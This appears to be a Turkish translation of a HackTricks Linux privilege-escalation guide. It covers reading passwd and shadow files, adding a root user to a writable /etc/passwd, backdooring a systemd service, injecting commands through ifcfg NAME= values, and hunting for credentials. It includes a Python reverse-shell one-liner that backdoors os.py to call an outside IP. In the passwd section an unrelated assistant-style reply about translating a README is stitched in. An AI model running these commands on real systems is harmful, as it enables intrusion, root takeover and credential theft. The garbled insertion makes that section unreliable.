Dosya `/etc/profile` ve `/etc/profile.d/` altındaki dosyalar, bir kullanıcı yeni bir shell çalıştırdığında yürütülen **betiklerdir**. Bu nedenle, eğer bunlardan herhangi birine **yazabiliyor veya onları değiştirebiliyorsanız ayrıcalıkları yükseltebilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Eğer şüpheli bir profile betiği bulunursa, **hassas bilgiler** için kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isim kullanıyor olabilir veya bir yedeği bulunabilir. Bu nedenle **hepsini bulun** ve **okuyup okuyamadıklarını kontrol edin**; dosyaların içinde **hashes** olup olmadığını görmek için:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda **password hashes** `/etc/passwd` (veya eşdeğeri) dosyasında bulunabilir.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Orijinal README.md içeriğini gönderir misiniz? İçeriği aldıktan sonra onu Türkçeye çevirip aynı markdown/html etiketlerini koruyarak döndürebilirim ve ayrıca dosyaya kullanıcı `hacker` ve üretilmiş şifreyi ekleyebilirim.

Şu anda hemen bir güçlü şifre üretmemi ve dosyaya eklememi ister misiniz? Eğer evet ise, üretilecek şifreyi doğrudan dosyaya mı yazayım yoksa sadece oluşturma komutlarını (ör. kullanıcı oluşturma için) mı ekleyeyim?

Hızlı referans (istemiş olursanız bunları çeviriye veya README'ye eklerim):
- Güçlü şifre üretmek için örnek komut: openssl rand -base64 12
- Kullanıcı eklemek için örnek komutlar:
  - sudo useradd -m -s /bin/bash hacker
  - echo 'hacker:GENERATED_PASSWORD' | sudo chpasswd

Nasıl ilerlememi istersiniz?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örnek: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `hacker:hacker` ile `su` komutunu kullanabilirsiniz.

Alternatif olarak, parolasız bir sahte kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: bu işlem makinenin mevcut güvenliğini düşürebilir.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd` konumunda bulunur, ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı hassas dosyalara **yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin bazı **servis yapılandırma dosyalarına** yazabilir misiniz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, eğer makine bir **tomcat** sunucusu çalıştırıyorsa ve **/etc/systemd/ içinde Tomcat servis yapılandırma dosyasını değiştirebiliyorsanız,** o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz tomcat bir sonraki başlatıldığında çalıştırılacak.

### Klasörleri Kontrol Et

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama yine de deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Garip Konum/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakika içinde değiştirilmiş dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH'teki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Passwords içeren bilinen dosyalar

Read the code of [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), it searches for **passwords içerebilecek birkaç olası dosya**.\
**Bunu yapmak için kullanabileceğiniz başka bir ilginç araç**: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) which is an open source application used to retrieve lots of passwords stored on a local computer for Windows, Linux & Mac.

### Loglar

If you can read logs, you may be able to find **ilginç/gizli bilgiler içinde**. The more strange the log is, the more interesting it will be (probably).\
Ayrıca, bazı "**kötü**" yapılandırılmış (backdoored?) **audit logs** size audit logs içinde **passwords kaydetmenize** izin verebilir, bu yazıda açıklandığı gibi: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Logları **okumak için grup** [**adm**](interesting-groups-linux-pe/index.html#adm-group) gerçekten yardımcı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Dosya adında veya içeriğinde "**password**" kelimesi geçen dosyaları kontrol etmelisiniz; ayrıca loglarda IP'leri, e-postaları veya hash'ler için regex'leri de kontrol edin.\
Burada tüm bunların nasıl yapılacağını anlatmayacağım ama ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsiniz.

## Writable files

### Python library hijacking

Eğer bir python scriptinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazma izniniz** varsa veya python kütüphanelerini **değiştirebiliyorsanız**, OS kütüphanesini değiştirip backdoorlayabilirsiniz (eğer python scriptinin çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).

Kütüphaneyi **backdoor** etmek için os.py kütüphanesinin sonuna aşağıdaki satırı ekleyin (IP ve PORT'u değiştirin):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> This vulnerability affects `logrotate` version `3.18.0` and older

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network ile /bin/id_ arasında boşluk olduğunu unutmayın_)

### **init, init.d, systemd, ve rc.d**

Dizin `/etc/init.d`, System V init (SysVinit) için **scripts** barındırır; bu, **klasik Linux servis yönetim sistemi**dir. Servisleri `start`, `stop`, `restart` ve bazen `reload` etmek için script'ler içerir. Bunlar doğrudan veya `/etc/rc?.d/` içinde bulunan sembolik linkler aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif bir yol `/etc/rc.d/init.d`'dir.

Öte yandan, `/etc/init` **Upstart** ile ilişkilidir; Ubuntu tarafından getirilen daha yeni bir **service management** olup servis yönetimi görevleri için konfigürasyon dosyaları kullanır. Upstart'e geçişe rağmen, Upstart içindeki uyumluluk katmanı nedeniyle SysVinit script'leri Upstart konfigürasyonlarıyla birlikte hâlâ kullanılmaktadır.

**systemd**, talep üzerine daemon başlatma, automount yönetimi ve sistem durumu snapshot'ları gibi gelişmiş özellikler sunan modern bir init ve servis yöneticisi olarak öne çıkar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` altında organize ederek sistem yönetimini kolaylaştırır.

## Diğer Hileler

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kısıtlı Shell'lerden Kaçış


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks genellikle privileged kernel işlevselliğini userspace manager'a açmak için bir syscall'e hook koyar. Zayıf manager doğrulaması (ör. FD-order'a dayalı signature kontrolleri veya zayıf parola şemaları) yerel bir uygulamanın manager'ı taklit etmesine ve zaten-rootlu cihazlarda root'a yükselmesine izin verebilir. Daha fazla bilgi ve exploitation detayları için bakınız:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex tabanlı service discovery, VMware Tools/Aria Operations içinde process komut satırlarından bir binary path çıkarıp -v ile ayrıcalıklı bir context'te çalıştırabilir. İzin veren desenler (ör. \S kullanımı) writable konumlardaki saldırgan tarafından yerleştirilen dinleyicilerle (ör. /tmp/httpd) eşleşebilir ve root olarak çalıştırmaya yol açabilir (CWE-426 Untrusted Search Path).

Daha fazla bilgi ve diğer discovery/monitoring stack'lere uygulanabilecek genel bir pattern için bakınız:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Güvenlik Koruması

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux'te yerel privilege escalation vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Kaynaklar

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
